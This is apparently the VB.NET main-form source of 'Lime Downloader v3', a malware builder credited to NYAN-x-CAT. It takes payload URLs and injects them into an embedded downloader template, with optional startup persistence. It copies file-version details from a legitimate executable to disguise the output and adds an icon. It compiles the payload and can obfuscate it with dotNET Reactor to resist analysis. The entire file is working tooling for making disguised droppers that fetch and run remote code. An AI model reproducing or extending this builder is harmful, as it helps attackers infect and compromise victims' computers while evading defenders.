'--------------------------------
'Nyan Cat 09/23/2018
'https://github.com/NYAN-x-CAT/
'--------------------------------

Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            HuraForm1.Text = String.Format("Lime Downloader v3   @{0}", Environment.UserName)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub btnIcon_Click(sender As Object, e As EventArgs) Handles btnIcon.Click
        Try
            Dim o As New OpenFileDialog : o.Filter = "ico|*.ico"
            If o.ShowDialog = DialogResult.OK Then txtIcon.Text = o.FileName Else txtIcon.Text = ""
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private Sub btnAssembly_Click(sender As Object, e As EventArgs) Handles btnAssembly.Click
        Try
            Dim o As New OpenFileDialog : o.Filter = "exe|*.exe"
            If o.ShowDialog = DialogResult.OK Then txtAssembly.Text = o.FileName Else txtAssembly.Text = ""
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private rand As New Random
    Private Source As String = My.Resources.Source
    Private nameDLL As String = Randomi(rand.Next(4, 9))
    Private nameParent As String = Randomi(rand.Next(4, 9))
    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click

        Dim s As New SaveFileDialog
        Try
            If txtURL.Text <> "" Then
                s.Filter = "Executable |*.exe"
                s.InitialDirectory = Application.StartupPath
                If s.ShowDialog = DialogResult.OK Then

                    txtLog.Clear()

                    If chkInstall.Checked Then
                        Logs("Enabling Startup...")
                        Source = Replace(Source, "'$INS$", Nothing)
                    End If

                    Dim URL As String = ""
                    For Each Line As String In txtURL.Lines
                        URL += (Line) + "#$"
                    Next

                    Source = Replace(Source, "$URLS$", URL)
                    Source = Replace(Source, "$DLL$", nameDLL)
                    Source = Replace(Source, "$RES$", nameParent)

                    Try
                        If txtAssembly.Text <> "" Then
                            Logs("Writing Assembly Information...")
                            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(txtAssembly.Text)
                            Source = Replace(Source, "'%ASSEMBLY%", Nothing)
                            Source = Replace(Source, "%Title%", info.InternalName)
                            Source = Replace(Source, "%Description%", info.FileDescription)
                            Source = Replace(Source, "%Company%", info.CompanyName)
                            Source = Replace(Source, "%Product%", info.ProductName)
                            Source = Replace(Source, "%Copyright%", info.LegalCopyright)
                            Source = Replace(Source, "%Trademark%", info.LegalTrademarks)
                            Source = Replace(Source, "%v1%", info.FileVersion)
                        End If
                    Catch ex As Exception
                    End Try

                    If txtIcon.Text <> "" Then
                        Logs("Compiling Payload And Icon...")
                        Codedom.Compiler(s.FileName, Source, nameParent, nameDLL, txtIcon.Text)
                    Else
                        Logs("Compiling Payload...")
                        Codedom.Compiler(s.FileName, Source, nameParent, nameDLL, Nothing)
                    End If


                    If chkObfuscation.Checked Then
                        Logs("Applying Obfuscation...")
                        IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor)
                        Dim process As New Process()
                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        process.StartInfo.FileName = "cmd.exe"
                        process.StartInfo.UseShellExecute = True
                        process.StartInfo.CreateNoWindow = True
                        process.StartInfo.WorkingDirectory = IO.Path.GetTempPath
                        process.StartInfo.Arguments = "/C dotNET_Reactor.exe -file """ & s.FileName & """ -control_flow_obfuscation 1  -flow_level 3 -suppressildasm 1 -obfuscation 1 -antitamp  1 -resourceencryption 0 -targetfile """ & s.FileName & """"
                        process.Start()
                        process.WaitForExit()
                    End If
                    Logs("Done! " + IO.Path.GetFileName(s.FileName))
                    Logs("")
                    Logs("~=[,,_,,]^‥^  GitHub.com/NYAN-x-CAT")
                End If
            Else
                Logs("Missing URL!")
            End If
        Catch ex As Exception
            Logs(ex.Message.ToString)
        End Try
        Try
            IO.File.Delete(IO.Path.GetTempPath + "\" + nameParent + ".Resources")
            IO.File.Delete(s.FileName + ".hash")
            IO.File.Delete(IO.Path.GetTempPath + "\dotNET_Reactor.exe")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Logs(ByVal MSG As String)
        On Error Resume Next
        If txtLogs.InvokeRequired Then : End If
        txtLog.Text = txtLog.Text.Insert(0, MSG + Environment.NewLine)
    End Sub

    Private Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function


End Class
